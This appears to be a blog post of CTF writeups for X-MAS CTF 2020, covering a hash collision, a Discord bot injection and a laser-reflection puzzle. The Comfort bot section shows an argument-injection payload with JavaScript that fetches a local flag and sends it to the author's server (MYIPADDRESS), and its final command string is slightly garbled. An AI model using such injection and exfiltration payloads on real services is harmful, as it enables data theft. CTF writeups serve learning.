---
layout: post
title:  "X-MAS CTF writeups"
date:   2020-12-17 12:59:36 +0200
categories: ctf
---

These are the writeups for the [X-MAS CTF 2020 by HTsP](https://xmas.htsp.ro/home) challenges that I personally solved.


## Help a Santa helper?

In this challenge you need to find hash collisions for a custom hashing algorithm. After passing the initial challenge using instructions from [here](https://security.stackexchange.com/questions/223157/how-can-i-find-a-sha-256-hash-with-a-given-suffix-using-hashcat) we are presented a menu:

```
Good, you can continue!
Hello, thanks for answering my call, this time we have to break into Krampus' server and recover a stolen flag.
We have to solve a hash collision problem to get into the server.
Sadly, we're on a hurry and you only have 2 actions you can make until we get detected.
Choose what you want to do:
1. hash a message
2. provide a collision
3. exit
```
The hashing algorithm is given in the challenge and it’s using AES and XOR to calculate the hash in 16 byte blocks:

Let’s first hash a 16 byte message, which is the length of and AES block. If we use “00000000000000000000000000000000” as the first hash the output will be directly from the AES algorithm, something like “6ea8be2…1e692df”. We can then calculate the next hash as 3 AES block as follows:

Let’s again use “0000000…0000000” as the first block so the self.hash will be the same as in the first message “6ea8be2…1e692df”. Let’s the set the hash from first message as the second block. It will then get XORed to zero in AES() call which produces the same value as in the previous block. The final hash will then be “6ea8be2…1e692df” XOR “6ea8be2…1e692df” which is zero. Now the algorithm is back to inital state for the third and final round when we again use “0000000…0000000” as the third block which produces exactly the same hash as the first message a.ka. a collision.

As a generalisation the colliding messages are MSG1 and MSG1+HASH_FOR_MSG1+MSG1. You can find the source code to get past the initial challenge below but I chose to enter the hashes manually since there was no time limit.

{% gist a1812fdfb9845cd8d6b28ae2a1f23ce8 %}


## Comfort bot

In this challenge we need to get a Discord bot to reveal the flag. The source code is provided as part of the challenge and analysing it quickly reveals a code injection exploit:

We can test the vulnerability by sending the bots commands like:
```
comf foo ','
comf foo ',1,'
comf foo ',1,2,'
````

Which translate to function calls like `cleverbot.SendAI('foo',1,2,'')` This takes advantage of the fact that Javascript is a loosely typed language and we can supply any number of arguments to the function. After we verify that the bot answers to these commands we can add JS code to get the flag and make an HTTP request to our own server:

```javascript
window.foo=new XMLHttpRequest();
window.foo.onreadystatechange = function() {window.open("http://MYIPADDRESS/"+this.responseText)}
window.turl = "http://localhost/flag";
window.foo.open("GET",window.turl,true);
window.foo.send();
```
With this code and the fact that function arguments are evaluated left to right the final command to send to the bot is:

```
comf foo',window.foo=new XMLHttpRequest(),window.foo.onreadystatechange = function() {window.open("http://MYIPADDRESS"http://localhost/flag",window.foo.open("GET",window.turl,true),window.foo.send(),'
```


## Krampus' Lazer Tag

 In this challenge you need play 50 rounds of Lazer tag against Krampus in 30 seconds. The instructions are given when you connect to the bot:
![Krampus instructions]({{ site.url }}/assets/krampustext.png)

For each round we get both Krampus and player positions in x∈(0,1), y∈(0,1). Since the walls are made out of mirrors that reflect lazer we need to consider reflections when placing the lazer blockers. I googled around how to best calculate reflections until I found this page on Google that demonstrates how to simplify the calculations. The main principle is to reduce the reflections to straight lines, which is illustrated in the image below.

<p align="center">
  <img width="460" height="300" src="https://i.stack.imgur.com/tUC3y.gif">
</p>


I setup a Jupyter notebook to visualise the situation and calculate the reflected player positions up to two reflections away:
![Krampus instructions]({{ site.url }}/assets/krampus1.png)

I then calculate the midpoints where the lazer converges and that will be the blocker 
positions.

![Krampus instructions]({{ site.url }}/assets/krampus2.png)

Next step is to calculate the reflected positions of the traps back to the [0,1],[0,1] coordinates. They overlap very closely to 16 positions but it’s still necessary to round up the coordinates so that there are only 16 positions since that is how many blockers we are given.

![Krampus instructions]({{ site.url }}/assets/krampus3.png)

Take a look at the notebook for more details: [LazerTag Jupyter notebook](https://github.com/j11b0/lazertag/blob/main/LazerTag.ipynb) or view the final code:

{% gist 3183bdb9f38fe52a3947064ed0e3bd4a %}
